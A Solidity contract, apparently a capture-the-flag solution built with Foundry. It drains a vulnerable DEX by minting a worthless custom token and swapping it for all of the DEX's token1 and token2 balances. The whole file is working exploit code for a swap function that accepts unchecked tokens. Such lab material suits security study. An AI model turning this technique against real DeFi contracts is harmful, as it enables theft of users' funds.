pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract CustomTokenThree is ERC20 {
    constructor(string memory name, string memory symbol, uint initialSupply, address victim) ERC20(name,symbol) {
        _mint(msg.sender, initialSupply);
        _mint(victim, 1); //give DEX victim minimum amount of one token
    }
}

interface IDex{
    function token1() external returns(address);
    function token2() external returns(address);
    function swap(address from, address to, uint amount) external;        
    function approve(address spender, uint amount) external;
}

contract AttackDexTwo{        
    IDex public dex;    
    CustomTokenThree public t3;
    address public token1;
    address public token2;
    address public token3;

    constructor(address _victim) {
        dex = IDex(_victim);
        token1 = dex.token1();
        token2 = dex.token2();
        t3 = new CustomTokenThree("Token3", "TKN3", 3, _victim);        
        token3 = address(t3);
    }
    
    function attack() public {                  

        t3.approve(address(dex), 9999); //allow dex to use our attacker's token3 coins
        dex.approve(address(dex), 9999); //allow dex contract to use our attacker's token1 and token2

        console.log(IERC20(token1).balanceOf(address(dex)));
        console.log(IERC20(token2).balanceOf(address(dex)));
        
        dex.swap(token3, token1,1);
        dex.swap(token3, token2,2);

        console.log(IERC20(token1).balanceOf(address(dex)));
        console.log(IERC20(token2).balanceOf(address(dex)));


        
        

    }
}
